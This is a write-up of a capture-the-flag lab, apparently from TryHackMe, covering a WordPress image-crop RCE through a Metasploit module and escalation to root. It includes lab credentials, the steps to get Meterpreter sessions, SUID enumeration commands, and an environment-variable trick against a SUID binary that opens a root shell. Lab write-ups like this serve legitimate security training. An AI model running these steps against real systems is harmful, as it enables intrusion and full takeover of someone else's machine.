# THM Lab – WordPress Crop RCE + Privesc (Summary Notes)

## Initial Access (Meterpreter Sessions)

1. **Exploit Used**  (with <u>searchsploit wordpress 5.0</u>)
   `exploit/multi/http/wp_crop_rce` (WordPress Image Crop RCE – CVE-2019-17671 related)

2. **Flow**  
   - Authenticated as `kwheel:cutiepie1` (WP creds)  
   - Uploaded malicious image payload  
   - Included it in theme → got **PHP Meterpreter** (session 1) as `www-data`  
   - Upgraded to **x86/Linux Meterpreter** (session 2) via `shell_to_meterpreter`  

3. **Sessions Summary**  
   - Session 1: PHP/Linux (www-data)  
   - Session 2: x86/Linux (www-data) – more stable for privesc  

   `getsystem` failed → PHP/Linux & x86/Linux Meterpreter do **not** support `priv` extension (only Windows Meterpreter does).

## Privilege Escalation Path

Looked for SUID files :

```sh
find / -user root -perm -4000 -print 2>/dev/null
```

**Key Discovery**: SUID binary `/usr/sbin/checker`

```bash
strings /usr/sbin/checker
...
admin
/bin/bash
Not an Admin
...
setuid
getenv
system
...
```

The logic of the C code likely looks something like this: `if (getenv("admin")) { setuid(0); system("/bin/bash"); } else { printf("Not an Admin"); }`

**Analysis**  
- Binary checks for environment variable **"admin"** using `getenv("admin")`  
- If `admin` is set (any value), calls `setuid(0)` → becomes **root**  
- Then executes `/bin/bash` → root shell  
- If not set → prints "Not an Admin" and exits

**Proof with ltrace** (confirms logic):

```bash
ltrace /usr/sbin/checker
getenv("admin") = "1"
setuid(0) = 0
```

**Exploitation Steps**

1. **Confirm SUID bit** (as www-data or jan):
   ```bash
   ls -l /usr/sbin/checker
   # Expected: -rwsr-xr-x 1 root root ... (SUID bit set)
   ```

2. **Trigger root shell** (one-liner):
   ```bash
   export admin=1
   /usr/sbin/checker
   ```

   → Drops you into **root** bash shell

3. **Post-root actions**:
   ```bash
   whoami          # root
   id              # uid=0(root)
   cd /root
   cat root.txt    # flag!
   ```

**Why this works**  
- Binary is **SUID root** → runs as root  
- Checks `getenv("admin")` → if set, calls `setuid(0)` → becomes root  
- Then runs `/bin/bash` → gives root shell  
- No password / complex exploit needed — trivial env var abuse

**Exam tip**: Always run `find / -perm -u=s -type f 2>/dev/null` to spot SUID binaries — then `strings` + `ltrace` to understand logic.

